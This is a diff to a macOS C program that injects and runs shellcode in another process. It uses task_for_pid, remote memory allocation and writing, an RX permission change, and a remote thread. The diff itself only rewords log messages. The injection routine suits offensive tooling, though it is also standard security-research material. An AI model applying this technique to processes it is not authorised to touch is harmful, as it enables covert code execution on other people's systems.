@@ -94,22 +94,22 @@ int main(int argc, char *argv[]){
 
     //get handle to remote task using task_for_pid() and cmd line arg
     task_t task;
-    printf("[*] Getting handle to task: %d\n", atoi(argv[1]));
+    printf("[*] getting handle to task: %d\n", atoi(argv[1]));
     task_for_pid(mach_task_self(), atoi(argv[1]), &task);
-    printf("[+] Handle for task: 0x%u\n", task);
+    printf("[+] handle for task: 0x%u\n", task);
 
 
     //allocate memory in remote task - save address to shellcode.addr
     mach_vm_allocate(task, &shellcode.addr, shellcode.size, VM_FLAGS_ANYWHERE);
-    printf("[+] Allocated %d bytes in remote buffer at: 0x%016lx\n", shellcode.size, shellcode.addr);
+    printf("[+] allocated %d bytes in remote buffer at: 0x%016lx\n", shellcode.size, shellcode.addr);
 
     kr = mach_vm_allocate(task, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
     if (kr != KERN_SUCCESS) {
-        fprintf(stderr, "Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+        fprintf(stderr, "[-] unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
         return (-2);
     }
     else {
-        fprintf(stderr, "[+] Allocated remote stack @0x%llx\n", remoteStack64);
+        fprintf(stderr, "[+] allocated remote stack @0x%llx\n", remoteStack64);
     }
 
 
@@ -135,15 +135,15 @@ int main(int argc, char *argv[]){
 
     //write payload into remote memory
     mach_vm_write(task, shellcode.addr, payload, sizeof(payload));
-    printf("[+] Writing %d bytes to remote buffer\n", shellcode.size);
+    printf("[+] writing %d bytes to remote buffer\n", shellcode.size);
 
     //adjust permissions from RW to RX
     mach_vm_protect(task, shellcode.addr, shellcode.size, 0, shellcode.prot);
-    printf("[+] Adjusting VM protections in buffer to RX\n");
+    printf("[+] adjusting VM protections in buffer to RX\n");
 
     //kick off shellcode
     //create a thread to run - we can use the existing thread state + allocated space for our stack 
-    printf("[*] Creating context for remote thread\n");
+    printf("[*] creating context for remote thread\n");
     x86_thread_state64_t remoteThreadState64;
 
     thread_act_t remoteThread;
@@ -162,14 +162,14 @@ int main(int argc, char *argv[]){
     remoteThreadState64.__rsp = (u_int64_t)remoteStack64;
     remoteThreadState64.__rbp = (u_int64_t)remoteStack64;
 
-    printf("[+] Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p);
+    printf("[+] remote Stack 64  0x%llx, remote code is 0x%p\n", remoteStack64, p);
 
     /*
      * create thread and launch it in one go
      */
     kr = thread_create_running(task, x86_THREAD_STATE64,(thread_state_t)&remoteThreadState64, x86_THREAD_STATE64_COUNT, &remoteThread);
     if (kr != KERN_SUCCESS) {
-        fprintf(stderr, "[-] Unable to create remote thread: error %s", mach_error_string(kr));
+        fprintf(stderr, "[-] unable to create remote thread: error %s", mach_error_string(kr));
         return (-3);
     }
 
@@ -178,20 +178,18 @@ int main(int argc, char *argv[]){
     for (;;) {
         kr = thread_get_state(remoteThread, x86_THREAD_STATE64, (thread_state_t)&remoteThreadState64, &thread_state_count);
         if (kr != KERN_SUCCESS) {
-            fprintf(stderr, "[-] Error getting stub thread state: error %s", mach_error_string(kr));
+            fprintf(stderr, "[-] error getting stub thread state: error %s", mach_error_string(kr));
             break;
         }
         
         if (remoteThreadState64.__rax == 0xD13) {
-            printf("Stub thread finished!\n");
+            printf("[!] Stub thread finished!\n");
             kr = thread_terminate(remoteThread);
             if (kr != KERN_SUCCESS) {
-                fprintf(stderr, "[-] Error terminating stub thread: error %s", mach_error_string(kr));
+                fprintf(stderr, "[-] error terminating stub thread: error %s", mach_error_string(kr));
             }
             break;
         }
     }
     
-
-    printf("done!");
 }
